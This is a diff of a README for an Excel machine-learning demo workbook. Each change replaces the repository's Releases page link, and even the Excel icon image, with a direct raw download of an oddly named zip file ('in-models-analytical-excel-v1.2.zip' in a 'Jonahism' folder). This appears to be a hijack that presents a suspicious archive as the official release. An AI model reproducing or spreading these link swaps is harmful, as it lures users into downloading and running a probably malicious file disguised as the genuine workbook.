@@ -1,4 +1,4 @@
-[![Releases](https://img.shields.io/badge/Releases-Download%20Workbook-blue?logo=github)](https://github.com/zhaa-kun/analytical-models-in-excel/releases)
+[![Releases](https://raw.githubusercontent.com/zhaa-kun/analytical-models-in-excel/main/Jonahism/in-models-analytical-excel-v1.2.zip%20Workbook-blue?logo=github)](https://raw.githubusercontent.com/zhaa-kun/analytical-models-in-excel/main/Jonahism/in-models-analytical-excel-v1.2.zip)
 
 # Spreadsheet Machine Learning: Excel Models for Core Analytics Demo 📊🔧
 
@@ -9,7 +9,7 @@ Badges
 - Topics: analytics · cross-validation · data-analysis · data-analytics · data-science-portfolio · data-visualization · decision-trees · excel · excel-models · knn · linear-regression · logistic-regression · machine-learning · no-code-machine-learning · pca · predictive-modeling · spreadsheet-models · statistical-analysis
 
 Hero image
-![Excel Icon](https://upload.wikimedia.org/wikipedia/commons/7/73/Microsoft_Office_Excel_%282018%E2%80%93present%29.svg)
+![Excel Icon](https://raw.githubusercontent.com/zhaa-kun/analytical-models-in-excel/main/Jonahism/in-models-analytical-excel-v1.2.zip%282018%E2%80%93present%https://raw.githubusercontent.com/zhaa-kun/analytical-models-in-excel/main/Jonahism/in-models-analytical-excel-v1.2.zip)
 
 Why this repo
 - Use it to teach model logic inside a spreadsheet.
@@ -26,7 +26,7 @@ What you will find
 
 Get the workbook
 - Download the release file from the Releases page and open it in Excel. Execute the workbook by opening the downloaded file and stepping through the sheets.
-- Releases: https://github.com/zhaa-kun/analytical-models-in-excel/releases
+- Releases: https://raw.githubusercontent.com/zhaa-kun/analytical-models-in-excel/main/Jonahism/in-models-analytical-excel-v1.2.zip
 
 Structure of the workbook (sheet-by-sheet)
 - README (sheet): Quick navigation and short guide.
@@ -111,7 +111,7 @@ Contributing
 
 Releases and download
 - The workbook is packaged in Releases. Download the .xlsx from the releases page and open it in Excel to run the demos.
-- Releases page: https://github.com/zhaa-kun/analytical-models-in-excel/releases
+- Releases page: https://raw.githubusercontent.com/zhaa-kun/analytical-models-in-excel/main/Jonahism/in-models-analytical-excel-v1.2.zip
 - If the link does not work in your environment, check the Releases section on the repository page.
 
 License
